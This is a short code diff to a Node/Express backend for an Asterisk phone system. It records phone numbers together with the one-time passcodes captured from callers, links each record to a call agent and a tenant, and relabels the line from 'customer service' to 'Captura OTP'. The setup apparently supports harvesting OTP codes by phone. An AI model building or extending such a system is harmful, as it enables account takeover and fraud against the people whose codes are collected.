+              const currentStatus = statusMap[statusKey] || statusMap[num] || 'pending';
+
+              const existingIndex = capturedOtpHistory.findIndex(
+                (r) =>
+                  r.number === num &&
+                  r.otp === code &&
+                  (!cleanResolvedAgent || !r.agent || r.agent === cleanResolvedAgent)
+              );
 
               if (existingIndex >= 0) {
-                // Actualizar status si cambió
                 capturedOtpHistory[existingIndex].status = currentStatus;
+                if (!capturedOtpHistory[existingIndex].agent && cleanResolvedAgent) {
+                  capturedOtpHistory[existingIndex].agent = cleanResolvedAgent;
+                }
               } else {
-                // Nuevo registro detectado desde AstDB -> ponerlo al frente
+                let resolvedTenantId: string | undefined;
+                if (cleanResolvedAgent) {
+                  const extNum = parseInt(cleanResolvedAgent, 10);
+                  const matched = storedTenants.find((t: any) => extNum >= t.extensionStart && extNum <= t.extensionEnd);
+                  if (matched) resolvedTenantId = matched.id;
+                }
                 capturedOtpHistory.unshift({
-                  id: 'astdb-' + num + '-' + code,
+                  id: 'astdb-' + num + '-' + (cleanResolvedAgent || 'ext') + '-' + code,
                   number: num,
                   otp: code,
                   timestamp: new Date().toLocaleTimeString(),
                   createdAt: Date.now(),
-                  channel: 'Ext. 7777',
-                  service: 'Servicio al Cliente (7777)',
+                  channel: cleanResolvedAgent ? `PJSIP/${cleanResolvedAgent}` : 'Ext. 4001',
+                  service: 'Captura OTP (4001)',
                   status: currentStatus,
+                  agent: cleanResolvedAgent,
+                  tenantId: resolvedTenantId,
                 });
                 if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
               }
@@ -6597,7 +6669,10 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
 
         // Actualizar estados sincronizados desde AstDB para todos los registros
         for (const r of capturedOtpHistory) {
-          if (statusMap[r.number]) {
+          const perAgentKey = r.agent ? `${r.number}_${r.agent}` : r.number;
+          if (statusMap[perAgentKey]) {
+            r.status = statusMap[perAgentKey];
+          } else if (statusMap[r.number] && !r.agent) {
             r.status = statusMap[r.number];
           }
         }
